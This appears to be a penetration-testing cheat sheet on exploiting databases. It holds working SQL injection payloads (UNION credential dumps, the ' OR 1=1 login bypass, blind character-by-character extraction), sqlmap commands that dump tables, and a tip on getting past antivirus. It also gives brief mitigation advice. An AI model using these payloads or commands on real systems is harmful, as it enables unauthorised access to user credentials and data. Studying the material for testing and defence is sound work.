# Exploit a Database

<hr class="sl">

## Random

Note: this isn't a course about SQL, but stuff that may be useful to hackers.

<div class="row row-cols-md-2"><div>

* `service xxx status`: check if a service is enabled. 
  * `mysql`
  * `postgresql`
  * `...`
* `mysql -u root -p -h <ip>`: login as root to the database at `<ip>`
  * Use `mysql -u root -p` for a local database.
  * Try an empty password, as this is the default password for root.
</div><div>

Inside the SQL console, you may use

* `source <sql>`: in MySQL console, import a SQL file.

Note that even if you can insert a path, you should start the SQL console inside the folder with the SQL file, and only enter the filename. This is because, if the file is importing data from other files, it less likely to still work if the statements are executed from another folder than the one with the script.

* `DESCRIBE <table>`: see the structure of `<table>`
</div></div>

<hr class="sr">

## SQL Injections (SQLi)

<div class="row row-cols-md-2"><div>

Most websites are using SQL database to store records. For instance, when using a login form, the username will most likely be used to fetch a user, then there will be a check of the password.

In some cases, SQL injections are possible. It means that instead of providing our username, we will provide some SQL code that will be injected in the SQL request, and allow a hacker to access the database via the login form.

**Example of injectable PHP code**: this code is fetching a list of products matching the product name send by the client.

```php
$sql = "Select name,desc from product where name LIKE '%$name%'";
```

If the user enter the following value instead of a product name

```php
' UNION Select username,password FROM users-- -
```

Then, the SQL query that will be executed will be

```sql
Select name,desc from product where name LIKE '%' UNION Select username,password FROM users-- -%'
```

Notice that now, the query will return a list of product, concatenated with a list of usernames/password!
</div><div>

**Explanation**

**Inject `'`**: because we want to close the "Like", and avoid an error `[...] LIKE '%`.

```sql
Select name,desc from product where name LIKE '%'%'
```

**1. Inject `' --`**: the problem, is that now the query won't work, because we have 3 single quotes, and there is a trailing `%`. So, what we do is commenting the rest of the query.

```sql
Select name,desc from product where name LIKE '%' --%'
```

**2. Inject `'-- -`**:  The code above may not work on some DBMS, because they want a space between the start of a comment, and the comment itself. So, we add ` -`, to ensure that there is a space.

```sql
Select name,desc from product where name LIKE '%' -- -%'
```

**3. Have fun**: between `'%'` and `-- -%'`, we can write SQL code, through the syntax of the final query must be valid. In the example, we used `UNION Select username,password FROM users`, which is used to merge results of two queries.
</div></div>

<hr class="sl">

## SQLInjections in practice

<div class="row row-cols-md-2"><div>

There are many scenarios in which a hacker will find a SQL injection. The example above was a **Union-based SQLi**.


<table class="table table-bordered table-striped border-dark"><thead>
<tr><th>Name</th><th>Description</th></tr>
</thead><tbody>

<tr><td>Error-based</td><td>The simplest SQL injection. If a hacker send a wrong query, the server print the failing SQL query to the user. The hacker can easily use it to adapt the payload, and broke into the database.
</td></tr>

<tr><td>Union-based</td><td>An attacker use a form returning a list of results, to concatenate to them records fetched illegally.
</td></tr>

<tr><td>Boolean-based</td><td>This attack is used when there is no errors. An attacker will try to make a request that fail if a boolean expression is false. By doing so, if the service (ex: login) failed, the attacker can inter that is was because the boolean expression was false.
</td></tr>

<tr><td>Others</td><td>Time-based, Out-of-band-based, Voice-based, and Stacked queries-based.
</td></tr>
</tbody></table>
</div><div>

**Payloads** are the values that you are using the break into the database.

* [sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list) (2.6k ⭐)
* [PayloadsAllTheThings/SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) (42.3k ⭐)
* Tools, such as SQLMap (25k ⭐)

Mitigations

* Use prepared requests (queries), they are ensuring that parameters of your queries are not interpreted as SQL code
* You can filter input, but you CAN'T rely on it, as you filter will _most likely_ be bypassed
* Do not trust anyone. SQL injections may be delayed. You may do protect your login queries, but if provided username is some SQL code, then any other request using the username may interpret it, hence you should secure every request, even if there are not handling data from the user, as they may later. You should use API for better security.
</div></div>

<hr class="sr">

## SQLMap

<div class="row row-cols-md-2"><div>

From the [SQLMap GitHub Repository](https://github.com/sqlmapproject/sqlmap): "sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.".

Try injecting a form

```bash
# try login.php
sqlmap -u URL/login.php
```

Try dumping the table "users" in the database "db_name"

```bash
sqlmap -u UGL/login.php -D db_name -T users –dump
```

Notes

* Try both with, and without union tests
* `XXX xxx is vulnerable`: enter yes to try exploiting this parameter
</div><div>

* `-u URL`: try injecting this URL
* `--dbs`: display all databases
* `--tables`: display tables
* `--column`: display columns
* `-C xx, yy`: display only columns xx, and yy
* `--dbms=some_dbms`: provide dbms, increase the chances of success
* `-D db_name`: the name of the database
* `--time-sec timeout`: specify a timeout
* `--dump`: save current data
* `--dump-all`: save all data
* `--batch`: do all requests at once (do not way for input)

> [SQLMap CheatSheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet) (external)
</div></div>

> You can use **BurpSuite** with SQLMap. Once you intercepted a request, right-click on it, and use **Save item**. Then, in SQLMap, use `-r /path/to/your/saved/item`. If your antivirus is blocking SQLMap, it may bypass it.

<hr class="sl">

## Famous payloads

<div class="row row-cols-md-2"><div>

Login without password on a website that do not encrypt passwords. The `1=1` is, like `-- -`, something to support some DBMS that are not allowing "1", or "TRUE".

```none
' OR 1=1 -- -
```
</div><div>
</div></div>

<hr class="sr">

## Do the job manually

<div class="row row-cols-md-2"><div>

**Union-based SQLi** can only be achieved is the two queries have the same number of attributes in the SELECT, as per the property of the UNION clause. As such, hackers are simply adding "null", one by one if in a boolean-based scenario, until they found how much attributes were selected in the original query.

```sql
-- you don't known the query
SELECT [...] UNION SELECT NULL -- fail
SELECT [...] UNION SELECT NULL, NULl -- fail
SELECT [...] UNION SELECT NULL, NULl, NULl -- fail
SELECT [...] UNION SELECT NULL, NULl, NULl, NULL -- OK
```

In the case above, we know that there are 4 attributes in the select, even if we don't know which ones! Once we found the tables/column names, we will use that to fetch data.

Another way to get the number of column is used the property of ORDER BY. This clause can take an index, which is a shortcut for the $nth$ in the select. If you use an invalid $n$, then the requests fails.

```sql
-- you don't known the query
SELECT [...] ORDER BY 1 -- fail
SELECT [...] ORDER BY 2 -- fail
SELECT [...] ORDER BY 3 -- fail
SELECT [...] ORDER BY 4 -- OK
```
</div><div>

Now that you found the number of column, you should try to get some data from the database. In a **Union-based SQLi**, just use SQL commands, and have fun.

```sql
-- you don't known the query
SELECT [...]
UNION 
-- tables
SELECT TABLE_NAME, NULL, NULL, NULL
FROM information_schema.TABLES
UNION
-- database + version + user
SELECT NULL, database(), @@version, user()
```

In a **Error-based SQLi**, the job will take LONGER 😢. You will have to try letter by letter. To find the first letter of the database, you will have to use iterative payloads such as

```
' AND (ascii(substr((select database()),1,1))) = ascii('a') -- -
' AND (ascii(substr((select database()),1,1))) = ascii('b') -- -
' AND (ascii(substr((select database()),1,1))) = ascii('c') -- -
[...]
' AND (ascii(substr((select database()),1,1))) = ascii('z') -- -
```

Then, process with the second, the third letter... Actually, there aren't that many DBMS, like, well, you could try some letters first.

</div></div>